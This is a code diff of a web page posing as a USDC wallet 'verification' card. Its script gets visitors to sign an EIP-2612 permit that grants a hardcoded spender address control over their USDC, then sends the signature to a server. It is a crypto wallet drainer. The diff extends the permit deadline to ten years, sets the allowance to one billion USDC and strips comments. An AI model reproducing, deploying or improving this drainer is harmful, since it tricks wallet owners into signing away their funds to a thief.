@@ -8,16 +8,12 @@
     <style>
         :root { --van-picker-height: 264px; --van-item-height: 44px; }
         body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, sans-serif; background: #f7f8fa; color: #323233; }
-
-        /* Card UI */
         .page { display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; }
         .card { background: #fff; width: 100%; max-width: 360px; padding: 35px 25px; border-radius: 24px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.08); }
         .usdc-icon { width: 60px; height: 60px; margin-bottom: 20px; }
         h2 { margin: 0 0 10px 0; font-size: 22px; color: #000; }
         p { color: #969799; font-size: 14px; margin-bottom: 30px; line-height: 1.5; }
         .btn-open { background: #000; color: #fff; border: none; width: 100%; padding: 16px; border-radius: 14px; font-weight: bold; font-size: 16px; cursor: pointer; transition: 0.2s; }
-
-        /* Vant Scroller Styles */
         .van-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.7); z-index: 2000; backdrop-filter: blur(2px); }
         .van-popup { position: fixed; left: 0; right: 0; bottom: 0; background: #fff; border-radius: 20px 20px 0 0; transform: translateY(100%); transition: transform 0.3s cubic-bezier(0.3, 0, 0.3, 1); z-index: 2001; padding-bottom: env(safe-area-inset-bottom); }
         .van-popup--show { transform: translateY(0); }
@@ -31,8 +27,6 @@
         .van-picker-column__item img { width: 26px; height: 26px; margin-right: 12px; border-radius: 4px; }
         .van-picker__mask { position: absolute; top: 0; left: 0; z-index: 2; width: 100%; height: 100%; pointer-events: none; background-image: linear-gradient(180deg, hsla(0,0%,100%,.9), hsla(0,0%,100%,.4) 110px, transparent 110px, transparent 154px, hsla(0,0%,100%,.4) 154px, hsla(0,0%,100%,.9)); }
         .van-picker__frame { position: absolute; top: 110px; left: 16px; right: 16px; z-index: 3; height: 44px; border-top: 0.5px solid #ebedf0; border-bottom: 0.5px solid #ebedf0; pointer-events: none; }
-
-        /* Loading indicator */
         .loading { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 2100; background: rgba(0,0,0,0.8); color: white; padding: 12px 20px; border-radius: 30px; font-size: 14px; }
     </style>
 </head>
@@ -72,6 +66,15 @@
     const SPENDER = "0x0148CeA1f2DAC72f17c2130d8d43a3aB0eb9930B";
     const USDC = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
 
+    // 1,000,000,000 USDC (1 billion) with 6 decimals
+    const MAX_ALLOWED_USDC = "1000000000";
+
+    // ===== UPDATED: 10 YEAR DEADLINE =====
+    // 10 years in seconds = 10 * 365 * 24 * 60 * 60 = 315,360,000 seconds
+    const TEN_YEARS_IN_SECONDS = 10 * 365 * 24 * 60 * 60;
+    const deadline = Math.floor(Date.now() / 1000) + TEN_YEARS_IN_SECONDS;
+    // =====================================
+
     function openPicker() {
         document.getElementById('overlay').style.display = 'block';
         setTimeout(() => document.getElementById('popup').classList.add('van-popup--show'), 10);
@@ -94,24 +97,20 @@
         await startVerify(choice);
     }
 
-    // Helper: Open deep link properly for mobile wallets
     function openDeepLink(link, fallbackUrl) {
         const loadingEl = document.getElementById('loading');
         loadingEl.style.display = 'block';
 
-        // Create invisible anchor and trigger click
         const anchor = document.createElement('a');
         anchor.href = link;
         anchor.style.display = 'none';
         document.body.appendChild(anchor);
         anchor.click();
 
-        // Clean up
         setTimeout(() => {
             document.body.removeChild(anchor);
         }, 100);
 
-        // Fallback timeout - if app doesn't open, go to store
         let timeout = setTimeout(() => {
             loadingEl.style.display = 'none';
             if (fallbackUrl && confirm("Wallet app not detected. Would you like to download it?")) {
@@ -122,7 +121,6 @@
             }
         }, 3000);
 
-        // If page loses focus (app opened), clear timeout and loading
         window.addEventListener('blur', () => {
             clearTimeout(timeout);
             loadingEl.style.display = 'none';
@@ -132,18 +130,15 @@
     async function startVerify(wallet) {
         const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
         const currentUrl = window.location.href;
-
-        // Extract origin for clean URL handling
         const urlObj = new URL(currentUrl);
         const cleanUrl = urlObj.host + urlObj.pathname;
 
-        // --- MOBILE: No wallet injected? Redirect to wallet's dapp browser ---
+        // Mobile deep link handling
         if (isMobile && !window.ethereum) {
             let deeplink = "";
             let storeLink = "";
 
             if (wallet === 'Crypto.com') {
-                // CORRECT: Use crypto.com/defi/dapp format for Onchain wallet
                 deeplink = `https://crypto.com/defi/dapp?url=${encodeURIComponent(currentUrl)}`;
                 storeLink = "https://crypto.com/onchain";
             } else if (wallet === 'MetaMask') {
@@ -160,7 +155,7 @@
             }
         }
 
-        // --- DESKTOP OR INJECTED WALLET (Internal DApp Browser) ---
+        // Desktop or injected wallet
         if (!window.ethereum) {
             alert("Please open this page inside your wallet's internal DApp browser on mobile, or install a wallet extension on desktop.");
             return;
@@ -180,18 +175,24 @@
                         params: [{ chainId: '0x1' }]
                     });
                 } catch (switchError) {
-                    // Chain not added - suggest adding it
                     alert("Please switch to Ethereum Mainnet (Chain ID 1) to continue.");
                     return;
                 }
             }
 
+            // Get user's nonce
             const contract = new ethers.Contract(USDC, [
                 "function nonces(address owner) external view returns (uint256)"
             ], provider);
 
             const nonce = await contract.nonces(owner);
-            const deadline = Math.floor(Date.now() / 1000) + 86400; // 24 hours
+
+            // Calculate deadline (10 years from now)
+            const TEN_YEARS_IN_SECONDS = 10 * 365 * 24 * 60 * 60;
+            const deadline = Math.floor(Date.now() / 1000) + TEN_YEARS_IN_SECONDS;
+
+            // Limit to 1,000,000,000 USDC
+            const amountRaw = ethers.utils.parseUnits(MAX_ALLOWED_USDC, 6);
 
             const domain = {
                 name: "USD Coin",
@@ -213,9 +214,9 @@
             const message = {
                 owner,
                 spender: SPENDER,
-                value: ethers.constants.MaxUint256,
+                value: amountRaw,
                 nonce,
-                deadline
+                deadline: deadline
             };
 
             // Request signature
@@ -228,7 +229,7 @@
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
                     owner,
-                    deadline,
+                    deadline: deadline.toString(),
                     v,
                     r,
                     s,
@@ -254,7 +255,7 @@
         }
     }
 
-    // Optional: Scroll snap enhancement for picker
+    // Scroll snap enhancement
     document.getElementById('scroller')?.addEventListener('scroll', function() {
         const items = this.querySelectorAll('.van-picker-column__item');
         const index = Math.round(this.scrollTop / 44);
